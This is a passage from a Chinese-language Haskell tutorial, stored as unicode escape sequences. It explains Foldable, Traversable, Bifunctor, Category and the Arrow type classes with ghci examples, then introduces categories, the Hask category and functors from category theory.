\u7684\u5b9e\u4f8b\uff0c\u5176\u5b83\u7684\u51fd\u6570\u90fd\u6709\u7531\u8fd9\u4e24\u4e2a\u51fd\u6570\u63d0\u4f9b\u7684\u9ed8\u8ba4\u5b9e\u73b0\uff0c\u800c\u4e14\u8fd9\u4e24\u4e2a\u51fd\u6570\u4e4b\u95f4\u4e5f\u6709\u76f8\u4e92\u5b9e\u73b0\u3002\u56e0\u6b64\u53ea\u8981\u5b9e\u73b0 foldr \u6216 foldMap \u4e00\u4e2a\u51fd\u6570\u5c31\u53ef\u4ee5\u4f7f\u7528\u6240\u6709\u5176\u5b83 Foldable \u4e2d\u7684\u51fd\u6570\u3002foldr \u51fd\u6570\u5728\u524d\u9762\u5df2\u7ecf\u6709\u5b66\u8fc7\uff0cfoldMap \u7684\u4f8b\u5b50\u662f\uff1a ghci > foldMap Sum [ 1 , 3 , 5 ] Sum { getSum = 9 } ghci > foldMap Product [ 1 , 3 , 5 ] Product { getProduct = 15 } ghci > foldMap ( replicate 3 ) [ 1 , 2 , 3 ] [ 1 , 1 , 1 , 2 , 2 , 2 , 3 , 3 , 3 ] Foldable \u5b9e\u4f8b \u00b6 []\u3001Maybe\u3001Either a\u3001(,) a \u90fd\u662f Foldable \u7684\u5b9e\u4f8b\uff0c\u6807\u51c6\u5bb9\u5668\u5e93\u4e2d\u7684 Map\u3001Set \u7b49\u4e5f\u90fd\u662f Foldable \u7684\u5b9e\u4f8b\u3002\u4e5f\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e8c\u53c9\u6811\u7c7b\u578b\uff0c\u5e76\u4f7f\u5176\u6210\u4e3a Foldable \u7684\u5b9e\u4f8b\uff1a data Tree a = Empty | Leaf a | Node ( Tree a ) a ( Tree a ) instance Foldable Tree where foldMap :: Monoid m => ( a -> m ) -> Tree a -> m foldMap f Empty = mempty foldMap f ( Leaf x ) = f x foldMap f ( Node l k r ) = foldMap f l ` mappend ` f k ` mappend ` foldMap f r \u5e38\u7528\u51fd\u6570 \u00b6 asum :: (Alternative f, Foldable t) => t (f a) -> f a\uff0c\u7528 <|> \u9010\u4e2a\u8fde\u63a5\u6240\u6709\u5143\u7d20 sequenceA_ :: (Applicative f, Foldable t) => t (f a) -> f ()\uff0c\u7531\u4e8e\u4e22\u5f03\u7ed3\u679c\uff0c\u6240\u4ee5 Foldable t \u5c31\u53ef\u4ee5\u6ee1\u8db3\uff1b\u56e0\u6b64\u4e0d\u540c\u4e8e sequenceA \u9700\u8981 Traversable traverse_ :: (Applicative f, Foldable t) => (a -> f b) -> t a -> f () for_ :: (Applicative f, Foldable t) => t a -> (a -> f b) -> f () Traversable \u00b6 Traversable \u662f\u8868\u793a\u53ef\u904d\u5386\u7684\u7c7b\u578b\u7c7b\uff0c\u5728 Data.Traversable \u6a21\u5757\u4e2d\u5b9a\u4e49\uff0c\u5b83\u662f Foldable \u7684\u5347\u7ea7\u7248\uff0c\u540c\u65f6\u4e5f\u662f\u4e00\u4e2a Functor\uff0c\u5b83\u7684\u5b9a\u4e49\u662f\uff1a class ( Functor t , Foldable t ) => Traversable t where traverse :: Applicative f => ( a -> f b ) -> t a -> f ( t b ) sequenceA :: Applicative f => t ( f a ) -> f ( t a ) mapM :: Monad m => ( a -> m b ) -> t a -> m ( t b ) sequence :: Monad m => t ( m a ) -> m ( t a ) {-# MINIMAL traverse | sequenceA #-} \u6700\u5c11\u53ea\u9700\u8981\u5b9e\u73b0 traverse \u51fd\u6570\u6216\u8005 sequenceA \u51fd\u6570\u3002\u5176\u4e2d\u5404\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u901a\u8fc7\u7c7b\u578b\u7b7e\u540d\u4e5f\u90fd\u80fd\u63a8\u6d4b\u51fa\u6765\u3002\u4f46\u662f\u5176\u4e2d mapM \u5c31\u662f traverse\uff0csequence \u5c31\u662f sequenceA\uff0c\u5b83\u4eec\u5b58\u5728\u53ea\u662f\u5386\u53f2\u9057\u7559 Traversable \u5b9e\u4f8b \u00b6 instance Traversable Maybe where traverse _ Nothing = pure Nothing traverse f ( Just x ) = Just <$> f x instance Traversable [] where {-# INLINE traverse #-} traverse f = foldr cons_f ( pure [] ) where cons_f x ys = liftA2 ( : ) ( f x ) ys instance Traversable ( Either a ) where traverse _ ( Left x ) = pure ( Left x ) traverse f ( Right y ) = Right <$> f y instance Traversable ((,) a ) where traverse f ( x , y ) = (,) x <$> f y ... \u4e0a\u9762\u7684 Tree \u4e5f\u53ef\u4ee5\u6210\u4e3a Traversable \u7684\u5b9e\u4f8b\uff1a instance Functor Tree where fmap :: ( a -> b ) -> Tree a -> Tree b fmap g Empty = Empty fmap g ( Leaf x ) = Leaf $ g x fmap g ( Node l x r ) = Node ( fmap g l ) ( g x ) ( fmap g r ) instance Traversable Tree where traverse :: Applicative f => ( a -> f b ) -> Tree a -> f ( Tree b ) traverse g Empty = pure Empty traverse g ( Leaf x ) = Leaf <$> g x traverse g ( Node l x r ) = Node <$> traverse g l <*> g x <*> traverse g r Traversable Laws \u00b6 Traversable \u4e5f\u6709\u4e24\u6761\u5b9a\u5f8b\uff1a 1. traverse Identity = Identity 2. traverse (Compose . fmap g . f) = Compose . fmap (traverse g) . traverse f \u5176\u4e2d Identity \u548c Compose \u5206\u522b\u5b9a\u4e49\u5728 Data.Functor.Identity \u548c Data.Functor.Compose \u4e24\u4e2a\u6a21\u5757\u4e2d\uff1a newtype Identity a = Identity { runIdentity :: a } deriving ( ... ) newtype Compose f g a = Compose { getCompose :: f ( g a ) } deriving ( ... ) Bifunctor \u00b6 Functor \u7684\u5b9e\u4f8b\u7684 kind \u90fd\u662f * -> *\uff0c\u56e0\u6b64 fmap \u53ea\u80fd\u5c06\u4e00\u4e2a\u51fd\u6570\u6620\u5c04\u5230\u4e00\u4e2a\u503c\u4e0a\u3002\u800c Bifunctor\uff08\u5728 Data.Bifunctor \u6a21\u5757\u4e2d\u5b9a\u4e49\uff09\u7684\u5b9e\u4f8b\u7684 kind \u662f * -> * -> *\uff0c\u800c\u4e14\u5b83\u7684 bimap \u53ef\u4ee5\u540c\u65f6\u5c06\u4e24\u4e2a\u51fd\u6570\u6620\u5c04\u5230\u4e24\u4e2a\u503c\u4e0a\uff1a class Bifunctor p where bimap :: ( a -> b ) -> ( c -> d ) -> p a c -> p b d first :: ( a -> b ) -> p a c -> p b c second :: ( b -> c ) -> p a b -> p a c {-# MINIMAL bimap | first, second #-} \u540c\u65f6 bimap \u548c first,second \u4e4b\u95f4\u4e5f\u53ef\u4ee5\u76f8\u4e92\u8f6c\u6362\uff1a bimap f g = first f . second g first f = bimap f id second g = bimap id g \u5bf9\u4e8e Functor\uff0c((,) e) \u548c Either e \u624d\u662f Functor \u7684\u5b9e\u4f8b\uff0c\u56e0\u4e3a\u4ed6\u4eec\u662f * -> *\u3002\u4f46\u662f\u5bf9\u4e8e Bifunctor\uff0c(,) \u548c Either \u5c31\u662f Bifunctor \u7684\u5b9e\u4f8b\uff1a ghci > bimap ( + 1 ) length ( 4 , [ 1 , 2 , 3 ]) ( 5 , 3 ) Bifunctor Laws \u00b6 bimap id id = id first id = id second id = id bimap (f . g) (h . i) = bimap f h . bimap g i first (f . g) = first f . first g second (f . g) = second f . second g Category \u00b6 Haskell \u4e2d\u7684 Category \u5c06\u4e00\u822c\u7684\u51fd\u6570\u63a8\u5e7f\u5230\u4e86\u666e\u904d\u7684\u6001\u5c04\u4e0a\uff0c\u5b83\u5728 Control.Category \u6a21\u5757\u4e2d\uff0c\u5b9a\u4e49\u662f\uff1a class Category cat where id :: cat a a ( . ) :: cat b c -> cat a b -> cat a c \u5b83\u7684\u5b9e\u4f8b\u6709 (->) \u548c Kleisli m \uff1a instance Category ( -> ) where id = GHC . Base . id ( . ) = ( GHC . Base .. ) Kleisli \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u7528\u6765\u8868\u793a\u51fd\u6570 a -> m b\uff0cHaskell \u4e2d\uff0c\u5b83\u5728 Control.Arrow \u6a21\u5757\u4e2d\u5b9a\u4e49\uff1a newtype Kleisli m a b = Kleisli { runKleisli :: a -> m b } instance Monad m => Category ( Kleisli m ) where id :: Kleisli m a a id = Kleisli return ( . ) :: Kleisli m b c -> Kleisli m a b -> Kleisli m a c Kleisli g . Kleisli h = Kleisli ( h >=> g ) Category \u8981\u6ee1\u8db3\u7684\u5b9a\u5f8b\u53ea\u6709 id \u662f (.) \u64cd\u4f5c\u7684\u5355\u4f4d\u5143\uff0c\u4ee5\u53ca (.) \u64cd\u4f5c\u662f\u53ef\u7ed3\u5408\u7684 \u540c\u65f6 Category \u8fd8\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570 <<< \u548c >>> \uff1a ( <<< ) :: Category cat => cat b c -> cat a b -> cat a c ( <<< ) = ( . ) ( >>> ) :: Category cat => cat a b -> cat b c -> cat a c f >>> g = g . f Arrow \u00b6 Arrow \u5c06\u51fd\u6570\u8fdb\u4e00\u6b65\u62bd\u8c61\u5316\uff0c\u5b83\u5b9a\u4e49\u5728 Control.Arrow \u6a21\u5757\u4e2d\uff1a class Category a => Arrow a where arr :: ( b -> c ) -> a b c first :: a b c -> a ( b , d ) ( c , d ) second :: a b c -> a ( d , b ) ( d , c ) ( *** ) :: a b c -> a b' c' -> a ( b , b' ) ( c , c' ) ( &&& ) :: a b c -> a b c' -> a b ( c , c' ) {-# MINIMAL arr, (first | (***)) #-} \u5176\u4e2d\uff1a arr \u51fd\u6570\u5c06\u4e00\u4e2a\u51fd\u6570\u53d8\u6210\u4e00\u4e2a Arrow first \u51fd\u6570\u5c06\u4e00\u4e2a Arrow \u53d8\u6210\u4e00\u4e2a\u4e8c\u5143\u7ec4\u95f4\u7684 Arrow\uff0c\u4e14\u53ea\u4f1a\u5bf9\u4e00\u4e2a\u5143\u7d20\u8fdb\u884c\u64cd\u4f5c\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4fdd\u6301\u4e0d\u53d8 second \u51fd\u6570\u4e0e first \u76f8\u53cd\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u4fdd\u6301\u4e0d\u53d8 *** \u51fd\u6570\u662f Arrow \u4e4b\u95f4\u7684 parallel composition\uff0c\u5bf9\u4e8e\u51fd\u6570: (g *** h) (x, y) = (g x, h y) &&& \u51fd\u6570\u662f Arrow \u4e4b\u95f4\u7684 fanout composition\uff0c\u5bf9\u4e8e\u51fd\u6570: (g &&& h) x = (g x, h x) \u5b83\u7684\u5b9e\u4f8b\u4e5f\u6709 (->) \u548c Kleisli\uff1a instance Arrow ( -> ) where arr :: ( b -> c ) -> ( b -> c ) arr g = g first :: ( b -> c ) -> (( b , d ) -> ( c , d )) first g ( x , y ) = ( g x , y ) instance Monad m => Arrow ( Kleisli m ) where arr :: ( b -> c ) -> Kleisli m b c arr f = Kleisli ( return . f ) first :: Kleisli m b c -> Kleisli m ( b , d ) ( c , d ) first ( Kleisli f ) = Kleisli ( \\ ~ ( b , d ) -> do c <- f b return ( c , d ) ) \u5e38\u7528\u51fd\u6570\uff1a returnA :: Arrow a => a b b returnA = arr id ( ^>> ) :: Arrow a => ( b -> c ) -> a c d -> a b d f ^>> a = arr f >>> a ( >>^ ) :: Arrow a => a b c -> ( c -> d ) -> a b d a >>^ f = a >>> arr f ( <<^ ) :: Arrow a => a c d -> ( b -> c ) -> a b d a <<^ f = a <<< arr f ( ^<< ) :: Arrow a => ( c -> d ) -> a b c -> a b d f ^<< a = arr f <<< a Arrow notation \u00b6 \u7c7b\u4f3c do-notation\uff0cArrow \u4e5f\u63d0\u4f9b\u4e86\u4e00\u5957\u65b9\u4fbf\u7684\u8bed\u53e5\uff1a proc x -> do y <- action1 -< ... z <- action2 -< ... returnA -< ... \u5176\u4e2d proc \u4ee3\u66ff\u4e86 lambda \u8868\u8fbe\u5f0f\u4e2d\u7684\u659c\u6760 \\\uff0c-< \u53f3\u8fb9\u7684\u4e3a\u8f93\u5165\uff0c\u5de6\u8fb9\u7684\u4e3a\u63a5\u6536\u8f93\u5165\u7684\u51fd\u6570\u3002\u6bd4\u5982\uff0c\u4e0b\u9762\u4e09\u79cd\u5199\u6cd5\u8fbe\u6210\u7684\u6548\u679c\u662f\u4e00\u6837\u7684\uff1a f :: Int -> ( Int , Int ) f = \\ x -> let y = 2 * x z1 = y + 3 z2 = y - 5 in ( z1 , z2 ) -- ghci> f 10 -- (23,15) fM :: Int -> Identity ( Int , Int ) fM = \\ x -> do y <- return ( 2 * x ) z1 <- return ( y + 3 ) z2 <- return ( y - 5 ) return ( z1 , z2 ) -- ghci> runIdentity (fM 10) -- (23,15) fA :: Int -> ( Int , Int ) fA = proc x -> do y <- ( 2 * ) -< x z1 <- ( + 3 ) -< y z2 <- ( subtract 5 ) -< y returnA -< ( z1 , z2 ) -- ghci> fA 10 -- (23,15) ArrowChoice \u00b6 class Arrow a => ArrowChoice a where left :: a b c -> a ( Either b d ) ( Either c d ) left = ( +++ id ) right :: a b c -> a ( Either d b ) ( Either d c ) right = ( id +++ ) ( +++ ) :: a b c -> a b' c' -> a ( Either b b' ) ( Either c c' ) f +++ g = left f >>> arr mirror >>> left g >>> arr mirror where mirror :: Either x y -> Either y x mirror ( Left x ) = Right x mirror ( Right y ) = Left y ( ||| ) :: a b d -> a c d -> a ( Either b c ) d f ||| g = f +++ g >>> arr untag where untag ( Left x ) = x untag ( Right y ) = y instance ArrowChoice ( -> ) where left f = f +++ id right f = id +++ f f +++ g = ( Left . f ) ||| ( Right . g ) ( ||| ) = either instance Monad m => ArrowChoice ( Kleisli m ) where left f = f +++ arr id right f = arr id +++ f f +++ g = ( f >>> arr Left ) ||| ( g >>> arr Right ) Kleisli f ||| Kleisli g = Kleisli ( either f g ) ArrowZero & ArrowPlus \u00b6 class Arrow a => ArrowZero a where zeroArrow :: a b c class ArrowZero a => ArrowPlus a where ( <+> ) :: a b c -> a b c -> a b c instance MonadPlus m => ArrowZero ( Kleisli m ) where zeroArrow = Kleisli ( \\ _ -> mzero ) instance MonadPlus m => ArrowPlus ( Kleisli m ) where Kleisli f <+> Kleisli g = Kleisli ( \\ x -> f x ` mplus ` g x ) \u4f8b\u5b50 \u00b6 ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) <+> ( Kleisli ( \\ x -> [ x , - x ]))) 2 [ 4 , 2 , - 2 ] ghci > either ( + 2 ) ( * 3 ) ( Left 3 ) 5 ghci > either ( + 2 ) ( * 3 ) ( Right 3 ) 9 ghci > ( + 2 ) ||| ( * 3 ) $ ( Left 3 ) 5 ghci > ( + 2 ) +++ ( * 3 ) $ ( Left 3 ) Left 5 ghci > ( + 2 ) ||| ( * 3 ) $ ( Right 3 ) 9 ghci > ( + 2 ) +++ ( * 3 ) $ ( Right 3 ) Right 9 ghci > left ( + 2 ) ( Left 3 ) Left 5 ghci > right ( * 3 ) ( Right 3 ) Right 9 ghci > left ( + 2 ) ( Right 3 ) Right 3 ghci > right ( * 3 ) ( Left 3 ) Left 3 ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) ||| ( Kleisli ( \\ x -> [ x , - x ]))) ( Left 3 ) [ 6 ] ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) ||| ( Kleisli ( \\ x -> [ x , - x ]))) ( Right 3 ) [ 3 , - 3 ] ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) +++ ( Kleisli ( \\ x -> [ x , - x ]))) ( Left 3 ) [ Left 6 ] ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) +++ ( Kleisli ( \\ x -> [ x , - x ]))) ( Right 3 ) [ Right 3 , Right ( - 3 )] Haskell \u4e0e\u8303\u7574\u8bba \u00b6 Haskell \u4e2d\u7684\u51fd\u5b50\u5355\u5b50\u7b49\u90fd\u4e0e\u8303\u7574\u8bba\uff08category theory\uff09\u6709\u5f88\u591a\u8054\u7cfb\uff0c\u6240\u4ee5\u6253\u7b97\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u8303\u7574\u8bba\u7684\u76f8\u5173\u5185\u5bb9\u3002 \u8303\u7574\u8bba \u662f\u6570\u5b66\u7684\u4e00\u95e8\u5b66\u79d1\uff0c\u4ee5\u62bd\u8c61\u7684\u65b9\u6cd5\u5904\u7406\u6570\u5b66\u6982\u5ff5\uff0c\u5c06\u8fd9\u4e9b\u6982\u5ff5\u5f62\u5f0f\u5316\u6210\u4e00\u7ec4\u7ec4\u7684\u201c\u7269\u4ef6\u201d\u53ca\u201c\u6001\u5c04\u201d\u3002\u6570\u5b66\u4e2d\u8bb8\u591a\u91cd\u8981\u7684\u9886\u57df\u53ef\u4ee5\u5f62\u5f0f\u5316\u4e3a\u8303\u7574\u3002\u4f7f\u7528\u8303\u7574\u8bba\u53ef\u4ee5\u4ee4\u8fd9\u4e9b\u9886\u57df\u4e2d\u8bb8\u591a\u96be\u7406\u89e3\u3001\u96be\u6349\u6478\u7684\u6570\u5b66\u7ed3\u8bba\u66f4\u5bb9\u6613\u53d9\u8ff0\u8bc1\u660e\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 \u8303\u7574\uff08Category\uff09 \u00b6 \u8303\u7574\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u96c6\u5408\uff0c\u4e00\u4e2a\u8303\u7574 \\(\\mathbf{C}\\) \u5305\u542b\u4e09\u4e2a\u7ec4\u6210\u6210\u5206\uff1a \u4e00\u4e2a\u7c7b \\(\\mathrm{ob}(\\mathbf{C})\\) \uff1a\u5176\u4e2d\u5143\u7d20\u79f0\u4e3a \u5bf9\u8c61\uff08objects\uff09 \u4e00\u4e2a\u7c7b \\(\\mathrm{hom}(\\mathbf{C})\\) \uff1a\u5176\u4e2d\u5143\u7d20\u79f0\u4e3a \u6001\u5c04\uff08morphisms\uff09 \uff08\u6216 \u7bad\u53f7\uff08arrows\uff09 \uff09\uff1a\u6bcf\u4e2a\u6001\u5c04\u8fde\u63a5\u4e86\u4e24\u4e2a\u5bf9\u8c61\uff1a\u6e90\u5bf9\u8c61\uff08source object\uff09\u3001\u76ee\u6807\u5bf9\u8c61\uff08target object\uff09\u3002\u5982\u679c \\(f\\) \u662f\u4ece\u6e90\u5bf9\u8c61 \\(A\\) \u5230\u76ee\u6807\u5bf9\u8c61 \\(B\\) \uff08 \\(A, B\\in \\mathrm{ob}(\\mathbf{C})\\) \uff09\u7684\u6001\u5c04\uff0c\u90a3\u4e48\u8bb0\u4e3a \\(f : A\\to B\\) \u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\uff0c\u79f0\u4e3a\u6001\u5c04 \u590d\u5408\uff08composition\uff09 \uff1a\u4e24\u4e2a\u6001\u5c04 \\(g : A\\to B\\) \u3001 \\(f : B\\to C\\) \u7684\u590d\u5408\u8bb0\u4e3a \\(f\\circ g : A\\to C\\) \u5728 Haskell \u548c\u5927\u90e8\u5206\u6570\u5b66\u7406\u8bba\u4e2d\u90fd\u662f\u4ece\u53f3\u5411\u5de6\u8ba1\u7b97\uff0c\u5373 \\(f\\circ g\\) \u4e2d\u662f\u5148\u8ba1\u7b97 \\(g : A\\to B\\) \u518d\u8ba1\u7b97 \\(f : B\\to C\\) \u8bb8\u591a\u4e1c\u897f\u90fd\u53ef\u4ee5\u7ec4\u6210\u8303\u7574\u3002\u6bd4\u5982: \u4f8b \u2003 \\(\\mathbf{Set}\\) \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u5bf9\u8c61\u4e3a\u6240\u6709\u96c6\u5408\uff0c\u6001\u5c04\u4e3a\u96c6\u5408\u4e4b\u95f4\u7684\u51fd\u6570\uff0c\u590d\u5408\u5373\u51fd\u6570\u4e4b\u95f4\u7684\u590d\u5408 \u2003 \\(\\mathbf{Grp}\\) \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u5bf9\u8c61\u4e3a\u6240\u6709\u7fa4\uff0c\u6001\u5c04\u4e3a\u7fa4\u540c\u6001\uff08group homomorphisms\uff09\uff0c\u4f8b\u5982\u5bf9\u4e8e\u7fa4 \\((G,*)\\) \u548c \\((H,\\cdot )\\) \uff0c\u6709\u7fa4\u540c\u6001 \\(h : (G,*)\\to (H,\\cdot )\\) \uff0c\u5219\u9700\u8981\u5bf9\u4e8e \\(G\\) \u4e2d\u7684\u4efb\u610f\u5143\u7d20 \\(u,v\\) \u6ee1\u8db3 \\[h(u*v)=h(u)\\cdot h(v)\\] \u6ce8\u610f \u6001\u5c04\u4e0d\u5fc5\u987b\u4e3a\u51fd\u6570\uff1b\u800c\u4e14\u53ef\u4ee5\u5b58\u5728\u6e90\u5bf9\u8c61\u548c\u76ee\u6807\u5bf9\u8c61\u90fd\u76f8\u540c\u7684\u4e0d\u540c\u6001\u5c04 \u8303\u7574\u516c\u7406 \u00b6 \u6bcf\u4e2a\u8303\u7574\u90fd\u9700\u8981\u6ee1\u8db3\u4e09\u6761\u5b9a\u5f8b\uff1a \u6001\u5c04\u590d\u5408\u9700\u8981\u6ee1\u8db3 \u7ed3\u5408\u5f8b\uff08associativity\uff09 \uff1a \\(f\\circ (g\\circ h) = (f\\circ g)\\circ h\\) \u8303\u7574\u5728\u590d\u5408\u64cd\u4f5c\u4e0b\u662f \u95ed\u5408\u7684\uff08closed\uff09 \uff1a \u2003\u2003\u2003\u5982\u679c\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u5b58\u5728\u6001\u5c04 \\(f : B\\to C\\) \u3001 \\(g : A\\to B\\) \uff0c\u90a3\u4e48\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u4e5f\u4e00\u5b9a\u5b58\u5728\u6001\u5c04 \\(h : A\\to C\\) \uff0c\u4e14 \\(h=f\\circ g\\) \u6bcf\u4e2a\u5bf9\u8c61\u90fd\u9700\u8981\u6709 \u5355\u4f4d\u6001\u5c04\uff08identity morphisms\uff09 \uff1a \u2003\u2003\u2003\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u7684\u5bf9\u8c61 \\(A\\) \uff0c\u4e00\u5b9a\u5b58\u5728\u5355\u4f4d\u6001\u5c04 \\(\\mathrm{id}_A : A\\to A\\) \uff0c\u4e14\u5bf9\u4e8e\u6bcf\u4e2a\u6001\u5c04 \\(g : A\\to B\\) \uff0c\u4e00\u5b9a\u6709\uff1a \\(g\\circ\\mathrm{id}_A = \\mathrm{id}_B\\circ g = g\\) \\(\\mathbf{Hask}\\) \u8303\u7574 \u00b6 \u8303\u7574 \\(\\mathbf{Hask}\\) \u7684\u5bf9\u8c61\u4e3a Haskell \u4e2d\u7684\u7c7b\u578b\uff08types\uff09\uff0c\u6001\u5c04\u662f Haskell \u4e2d\u7684\u51fd\u6570\uff0c\u590d\u5408\u8fd0\u7b97\u662f (.) \u3002\u5373\u4ece\u7c7b\u578b A \u5230\u7c7b\u578b B \u7684\u51fd\u6570 f :: A -> B \u5c31\u662f \\(\\mathbf{Hask}\\) \u8303\u7574\u4e2d\u7684\u4e00\u4e2a\u6001\u5c04\u3002\u800c\u51fd\u6570 f :: B -> C \u3001g :: A -> B \u7684\u7ec4\u5408 f . g \u5c31\u662f\u4e00\u4e2a\u65b0\u7684\u51fd\u6570 h :: A -> C\u3002 \u5bf9\u4e8e\u4e09\u6761\u5b9a\u5f8b\uff1a \u7b2c\u4e00\u6761\u663e\u7136\u6ee1\u8db3\uff1af . (g . h) = (f . g) . h \u7b2c\u4e8c\u6761\u4e5f\u663e\u7136\u6ee1\u8db3\uff0c\u5982\u679c\u6709\u51fd\u6570 f :: B -> C \u3001g :: A -> B\uff0c\u4e00\u5b9a\u6709\u51fd\u6570 h = (f . g) :: A -> C \u5bf9\u4e8e\u7b2c\u4e09\u6761\u5b9a\u5f8b\uff0cHaskell \u4e2d\u5b58\u5728\u5355\u4f4d\u51fd\u6570 id \uff0c\u4f46 id \u662f\u591a\u6001\uff08polymorphic\uff09\u7684\uff0c\u8981\u4e3a\u5176\u6307\u5b9a\u7c7b\u578b\u4f7f\u5176\u53d8\u6210\u5355\u6001\uff08monomorphic\uff09\u7684\u3002\u6bd4\u5982\u6001\u5c04 \\(\\mathrm{id}_A\\) \u5728 Haskell \u4e2d\u5c31\u53ef\u4ee5\u8868\u793a\u4e3a id :: A -> A\u3002\u5e76\u4e14\u663e\u7136\u6ee1\u8db3\u7b2c\u4e09\u6761\u5b9a\u5f8b\uff08\u5176\u4e2d f :: A -> B\uff09\uff1a (id :: B -> B) . f = f . (id :: A -> A) = f \u51fd\u5b50\uff08Functors\uff09 \u00b6 \u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u6001\u5c04\u5c06\u4e24\u4e2a\u5bf9\u8c61\u8054\u7cfb\u8d77\u6765\uff0c\u800c\u51fd\u5b50\u5219\u4f1a\u5c06\u4e24\u4e2a\u8303\u7574\u8054\u7cfb\u8d77\u6765\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u51fd\u5b50\u5c31\u662f\u4ece\u4e00\u4e2a\u8303\u7574\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u7684\u53d8\u6362\u3002\u6bd4\u5982\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u3001 \\(\\mathbf{D}\\) \uff0c\u5b9a\u4e49\u51fd\u5b50 \\(F : \\mathbf{C}\\to\\mathbf{D}\\) \u6ee1\u8db3\uff1a \u5bf9\u4e8e \\(\\mathbf{C}\\) \u4e2d\u7684\u4efb\u610f\u5bf9\u8c61 \\(A\\) \uff0c\u5728 \\(\\mathbf{D}\\) \u4e2d\u90fd\u6709\u5bf9\u8c61 \\(F(A)\\) \u5bf9\u4e8e \\(\\mathbf{C}\\) \u4e2d\u7684\u4efb\u610f\u6001\u5c04 \\(f : A\\to B\\) \uff0c\u5728 \\(\\mathbf{D}\\) \u4e2d\u90fd\u6709\u6001\u5c04 \\(F(f) : F(A)\\to F(B)\\) \u4f8b \u9057\u5fd8\u51fd\u5b50\uff08forgetful functor\uff09 \\(U : \\mathbf{Grp}\\to\\mathbf{Set}\\) \uff0c\u5c06\u4e00\u4e2a\u7fa4\u6620\u5c04\u5230\u4e00\u4e2a\u96c6\u5408\u4e2d\uff0c\u5c06\u7fa4\u540c\u6001\u6620\u5c04\u5230\u96c6\u5408\u95f4\u7684\u51fd\u6570 \u5e42\u96c6\u51fd\u5b50\uff08power set functor\uff09 \\(P : \\mathbf{Set}\\to\\mathbf{Set}\\) \uff0c\u5c06\u4e00\u4e2a\u96c6\u5408\u6620\u5c04\u5230\u5b83\u7684\u5e42\u96c6\uff0c\u5c06\u539f\u96c6\u5408\u4e2d\u7684\u51fd\u6570 \\(f : A\\to B\\) \u6620\u5c04\u5230\u51fd\u6570 \\(P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)\\) \uff0c\u5373\u4ece \\(U\\subseteq A\\) \u5230\u503c\u57df \\(f(U)\\subseteq B\\) \u7684\u6620\u5c04 \u81ea\u51fd\u5b50\uff08endofunctor\uff09 \\(1_{\\mathbf{C}} : \\mathbf{C}\\to\\mathbf{C}\\) \uff0c\u5c06\u4e00\u4e2a\u8303\u7574\u6620\u5c04\u5230\u5b83\u672c\u8eab \u51fd\u5b50\u516c\u7406 \u00b6 \u51fd\u5b50 \\(F : \\mathbf{C}\\to\\mathbf{D}\\) \u4e5f\u9700\u8981\u6ee1\u8db3\u4e24\u4e2a\u516c\u7406\uff1a \u5bf9\u4e8e\u4efb\u610f\u5bf9\u8c61 \\(X\\in\\mathbf{C}\\) \uff0c\u6052\u6709 \\(F(\\mathrm{id}_X)=\\mathrm{id}_{F(X)}\\) \u5bf9\u4e8e\u6001\u5c04 \\(f : Y\\to Z\\) \u3001 \\(g : X\\to Y\\) \uff0c\u6052\u6709 \\(F(f\\circ g) = F(f)\\circ F(g)\\) \\(\\mathbf{Hask}\\) \u8303\u7574\u4e0a\u7684\u51fd\u5b50 \u00b6 Haskell \u4e2d\u7684 Functor \u5b9a\u4e49\u662f\uff1a class Functor ( f :: * -> * ) where fmap :: ( a -> b ) -> f a -> f b \u5bf9\u4e8e Haskell \u4e2d\u7684 Functor\uff0c\u5b83\u5b9e\u9645\u4e0a\u662f\u4ece \\(\\mathbf{Hask}\\) \u8303\u7574\uff08types\uff09\u5230\u5b83\u5b50\u8303\u7574\u7684\u53d8\u6362\u3002\u6bd4\u5982\u5217\u8868\u51fd\u5b50 \\(\\texttt{[]} : \\mathbf{Hask}\\to\\mathbf{Lst}\\) \uff08\u5176\u4e2d \\(\\mathbf{Lst}\\) \u662f\u6240\u6709 Haskell \u4e2d\u5217\u8868\u7c7b\u578b\u6784\u6210\u7684\u8303\u7574\uff09 \u5b83\u4e5f\u8fbe\u6210\u4e86\u8303\u7574\u8bba\u4e2d\u5bf9\u4e8e\u51fd\u5b50\u7684\u8981\u6c42\u3002\u51fd\u5b50\u9700\u8981\u8fdb\u884c\u4e24\u4e2a\u64cd\u4f5c\uff1a\u5c06\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u5bf9\u8c61\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u4e2d\u3001\u5c06\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u6001\u5c04\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u4e2d\u3002\u4ee5 Maybe \u4e3a\u4f8b\uff0c\u5b83\u5b9e\u73b0\u4e86\u51fd\u5b50\u7684\u8981\u6c42\uff1a Maybe \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u4ed6\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b T \u53d8\u6210\u65b0\u7c7b\u578b Maybe T\uff0c\u76f8\u5f53\u4e8e\u4ece 